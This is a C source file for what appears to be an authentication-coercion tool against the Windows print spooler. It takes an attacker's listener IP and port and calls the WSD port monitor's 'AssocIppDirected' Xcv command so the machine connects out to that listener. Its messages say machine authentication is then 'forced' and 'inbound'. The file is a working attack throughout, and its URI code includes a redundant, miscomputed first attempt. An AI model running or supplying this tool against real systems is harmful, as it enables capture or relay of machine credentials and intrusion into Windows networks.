#include <windows.h>
#include <winspool.h>
#include <stdio.h>

#define ASSOC_TIMEOUT_MS  8000
#define XCV_MONITOR_NAME   L",XcvMonitor WSD Port"

#ifndef SERVER_ACCESS_ADMINISTER
#define SERVER_ACCESS_ADMINISTER 0x0001
#endif

typedef struct {
    HANDLE    hXcv;
    wchar_t  *uri;
    DWORD     cbIn;
    DWORD     needed;
    DWORD     status;
    DWORD     err;
    BOOL      ok;
} XCVJOB;

/* Dynamic function pointer for XcvDataW */
static BOOL (WINAPI *pXcvDataW)(HANDLE, PCWSTR, PBYTE, DWORD, PBYTE, DWORD, PDWORD, PDWORD);

static DWORD WINAPI xcv_worker(LPVOID param)
{
    XCVJOB *job = (XCVJOB *)param;
    job->ok = pXcvDataW(job->hXcv, L"AssocIppDirected",
                           (PBYTE)job->uri, job->cbIn,
                           NULL, 0, &job->needed, &job->status);
    job->err = GetLastError();
    return 0;
}

static wchar_t *str_append_a(wchar_t *dst, const char *src)
{
    while (*src) *dst++ = (wchar_t)(unsigned char)*src++;
    return dst;
}

static wchar_t *str_append_w(wchar_t *dst, const wchar_t *src)
{
    while (*src) *dst++ = *src++;
    return dst;
}

static wchar_t *str_append_port(wchar_t *dst, int port)
{
    wchar_t tmp[8];
    int i = 0;
    do { tmp[i++] = (wchar_t)(L'0' + port % 10); port /= 10; } while (port);
    while (i) *dst++ = tmp[--i];
    return dst;
}

int main(int argc, char *argv[])
{
    char         *ip;
    int           port;
    wchar_t       uri[512];
    wchar_t      *p;
    DWORD         cbIn;
    HANDLE        hServer = NULL, hXcv = NULL, hThread = NULL;
    HMODULE       ws;
    XCVJOB        job;
    PRINTER_DEFAULTSW pdServer = { NULL, NULL, READ_CONTROL };
    PRINTER_DEFAULTSW pdXcv    = { NULL, NULL, SERVER_ACCESS_ADMINISTER };

    if (argc < 3) {
        printf("[?] Usage: %s <listener-ip> <port>\n", argv[0]);
        return 1;
    }

    ip   = argv[1];
    port = atoi(argv[2]);

    if (port <= 0 || port > 65535) {
        printf("[-] Invalid port specified.\n");
        return 1;
    }

    /* --- build ipp://<ip>:<port>/ipp/print --- */
    p = str_append_w(uri, L"ipp://");
    p = str_append_a(p, ip);
    *p++ = L':';
    p = str_append_port(p, port);
    p = str_append_w(uri + 6 + strlen(ip), L"/ipp/print"); // safe string formatting below
    
    // Clean URI construction
    p = uri;
    p = str_append_w(p, L"ipp://");
    p = str_append_a(p, ip);
    *p++ = L':';
    p = str_append_port(p, port);
    p = str_append_w(p, L"/ipp/print");
    *p = L'\0';
    cbIn = (DWORD)((p - uri + 1) * sizeof(wchar_t));

    /* --- resolve winspool.drv APIs --- */
    ws = LoadLibraryA("winspool.drv");
    if (!ws ||
        !(pXcvDataW = (BOOL(WINAPI*)(HANDLE, PCWSTR, PBYTE, DWORD, PBYTE, DWORD, PDWORD, PDWORD))GetProcAddress(ws, "XcvDataW"))) {
        printf("[-] Failed to resolve winspool.drv exports\n");
        return 1;
    }

    /* --- local print server handle --- */
    if (!OpenPrinterW(NULL, &hServer, &pdServer)) {
        printf("[-] OpenPrinterW(server) failed: %lu\n", GetLastError());
        return 1;
    }

    /* --- WSD port-monitor config handle --- */
    if (!OpenPrinterW((PWSTR)XCV_MONITOR_NAME, &hXcv, &pdXcv)) {
        DWORD e = GetLastError();
        printf("[-] OpenPrinterW(%ls) failed: %lu%s\n",
                     XCV_MONITOR_NAME, e, e == ERROR_ACCESS_DENIED ? " (run elevated)" : "");
        ClosePrinter(hServer);
        return 1;
    }

    printf("[i] Triggering IPP association: %ls\n", uri);

    job.hXcv     = hXcv;
    job.uri      = uri;
    job.cbIn     = cbIn;
    job.needed   = 0;
    job.status   = 0;
    job.err      = 0;
    job.ok       = FALSE;

    /* --- fire association on a leashed thread --- */
    hThread = CreateThread(NULL, 0, xcv_worker, &job, 0, NULL);
    if (!hThread) {
        xcv_worker(&job);
    } else if (WaitForSingleObject(hThread, ASSOC_TIMEOUT_MS) != WAIT_OBJECT_0) {
        TerminateThread(hThread, 0);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        printf("[+] %d seconds hit - spooler still associating (auth already forced)\n",
            ASSOC_TIMEOUT_MS / 1000);
        return 0;
    } else {
        CloseHandle(hThread);
    }

    if (job.ok && job.status == ERROR_SUCCESS)
        printf("[+] Host responded\n");
    else if (job.ok)
        printf("[+] Target contacted - machine auth should be inbound (status %lu)\n", job.status);
    else
        printf("[-] Association failed (error %lu)\n", job.err);

    ClosePrinter(hXcv);
    ClosePrinter(hServer);
    return 0;
}
